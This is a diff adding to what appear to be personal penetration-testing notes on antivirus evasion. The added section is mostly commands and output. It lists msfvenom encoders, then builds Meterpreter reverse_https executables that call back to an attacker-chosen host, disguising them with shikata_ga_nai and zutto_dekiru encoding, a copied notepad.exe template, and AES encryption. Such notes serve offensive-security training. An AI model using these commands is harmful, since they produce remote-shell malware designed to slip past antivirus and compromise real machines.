@@ -13,3 +13,46 @@ Let's say if the second 20000 byte get flagged, we can break down agin with smal
 ```
 Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\nonosquare\met.exe -OutPath C:\nonosquare\avtest1 -Verbose -Force
 ```
+
+## play with Encoder or Encryptors
+Encoders generally used character substitution to replace bad characters
+```
+kali@kali:~$ msfvenom --list encoders
+
+Name Rank Description
+---- ---- -----------
+x64/xor normal XOR Encoder
+x64/xor_context normal Hostname-based Context Keyed Payload
+Encoder
+x64/xor_dynamic normal Dynamic key XOR Encoder
+x64/zutto_dekiru manual Zutto Dekiru
+x86/add_sub manual Add/Sub Encoder
+x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder
+```
+
+Encoder Useage
+```
+kali@kali:~$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
+```
+
+Enconder using Windows application as a template, copy C:\Windows\System32\notepad.exe to Kali and use it as a template
+```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
+```
+
+Encryption is design to replace to ineffectiveness of encoders for antivirus evasion
+```
+kali@kali:~$ msfvenom --list encrypt
+================================================
+Name
+----
+aes256
+base64
+rc4
+xor
+```
+
+Let's encrypt with AES and see
+```
+kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP PORT=443 --encrypt aes256 --encrypt-key fdgdgj93traskfaswergfsdfg33 -f exe -o met64_aes.exe
+```
